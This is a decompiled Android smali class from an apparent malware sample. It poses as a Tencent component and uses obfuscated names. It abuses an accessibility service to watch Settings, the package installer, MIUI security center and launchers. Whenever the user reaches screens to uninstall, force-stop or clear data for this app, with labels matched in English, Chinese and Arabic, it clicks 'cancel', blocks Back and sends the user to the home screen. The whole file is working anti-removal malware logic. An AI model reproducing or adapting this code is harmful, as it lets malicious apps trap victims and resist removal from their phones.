.class public Lcom/tencent/AppUninstallerEngine;
.super Ljava/lang/Object;
.source "Unin_tunesxconcerningn10_stall.java"


# static fields
.field static appname:Ljava/lang/String; = ""

.field static appname2:Ljava/lang/String; = ""

.field private static context:Lcom/tencent/AccessibilityServiceCore;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 6
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Lcom/tencent/AccessibilityServiceCore;
    .locals 1

    .line 6
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    return-object v0
.end method

.method public static check(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 6

    const-string v0, "Accessibility"

    const-string v1, "on"

    .line 18
    sget-object v2, Lcom/tencent/MainBackgroundService;->uninstall:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    if-nez p0, :cond_1

    return-void

    .line 23
    :cond_1
    :try_start_0
    sget-boolean v1, Lcom/tencent/AccessibilityServiceCore;->ifFinishiInitPermission:Z

    if-nez v1, :cond_2

    return-void

    .line 24
    :cond_2
    sget-boolean v1, Lcom/tencent/AutoPermissionGranter;->ifFinishAll:Z

    if-nez v1, :cond_3

    return-void

    :cond_3
    const-string v1, "22222222222"

    .line 27
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 28
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "com.android.settings.SubSettings"

    .line 29
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 30
    sget-object v2, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/tencent/AppUninstallerEngine;->appname:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_4

    sget-object v2, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 32
    :cond_4
    sget-object v2, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 33
    sget-object v2, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 42
    :cond_5
    sget-object v2, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v2, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    .line 47
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    .line 48
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_6

    sget-object v4, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_6

    .line 49
    sget-object v4, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v4}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 50
    sget-object v4, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v4}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 55
    :cond_6
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_7

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 56
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 57
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 60
    :cond_7
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 64
    sget-object v4, Lcom/tencent/LanguageManager;->installStr1:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v5, "cancel"

    if-nez v4, :cond_8

    :try_start_1
    sget-object v4, Lcom/tencent/LanguageManager;->installStr1:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_9

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 65
    :cond_8
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 66
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 67
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 71
    :cond_9
    sget-object v0, Lcom/tencent/LanguageManager;->installStr1:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_a

    sget-object v0, Lcom/tencent/LanguageManager;->installStr1:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_b

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 72
    :cond_a
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 73
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 74
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    :cond_b
    const-string v0, "\u5f3a\u5236\u505c\u6b62"

    .line 84
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    const-string v0, "\u5f3a\u884c\u505c\u6b62"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    const-string v0, "\u7ed3\u675f\u8fd0\u884c"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    const-string v0, "Force stop"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_d

    .line 85
    :cond_c
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 86
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 87
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    :cond_d
    const-string v0, "\u5220\u9664\u6570\u636e"

    .line 90
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_e

    const-string v0, "\u6e05\u9664\u6570\u636e"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_e

    const-string v0, "\u6e05\u9664\u5b58\u50a8\u7a7a\u95f4"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_e

    const-string v0, "Delete app data"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_f

    .line 91
    :cond_e
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 92
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 93
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 96
    :cond_f
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 97
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->CurrentName:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    :cond_10
    const-string v0, "Phone options"

    .line 114
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_11

    .line 115
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 116
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    :cond_11
    const-string v0, "\u0625\u064a\u0642\u0627\u0641"

    .line 121
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_12

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_13

    :cond_12
    const-string v0, "stop"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_14

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 122
    :cond_13
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 123
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 124
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 129
    :cond_14
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v4, "com.google.android.packageinstaller"

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v4, "android.app.alertdialog"

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_15

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    sget-object v4, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_15

    .line 133
    invoke-static {v5}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickByText(Ljava/lang/String;)Z

    .line 134
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 135
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    :cond_15
    const-string v0, "android.support.v7.widget.recyclerview"

    .line 140
    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v4, "com.android.settings"

    if-nez v0, :cond_16

    :try_start_2
    const-string v0, "android.widget.tablelayout"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_16

    const-string v0, "android.widget.linearlayout"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_16

    const-string v0, "android.widget.framelayout"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    :cond_16
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_17

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "com.miui.securitycenter"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    :cond_17
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_18

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0, p0}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/tencent/AppUninstallerEngine;->appname:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_19

    .line 145
    :cond_18
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012blockBack()V

    .line 146
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendMeHome()V

    .line 149
    :cond_19
    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "oppo"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    .line 150
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/AppUninstallerEngine$1;

    invoke-direct {v1}, Lcom/tencent/AppUninstallerEngine$1;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 160
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_1a
    const-string v0, "com.sec.android.app.launcher"

    .line 175
    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1b

    const-string v0, "com.android.launcher"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1c

    :cond_1b
    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1d

    :cond_1c
    const-string v0, "com.miui.home"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1e

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_1e

    .line 176
    :cond_1d
    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/tencent/AppUninstallerEngine$2;

    invoke-direct {v0}, Lcom/tencent/AppUninstallerEngine$2;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 186
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_1e
    return-void
.end method

.method public static start(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 2

    .line 12
    sput-object p0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    .line 13
    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "["

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "]"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/tencent/AppUninstallerEngine;->appname:Ljava/lang/String;

    .line 14
    sget-object p0, Lcom/tencent/AppUninstallerEngine;->context:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/tencent/AppUninstallerEngine;->appname2:Ljava/lang/String;

    return-void
.end method
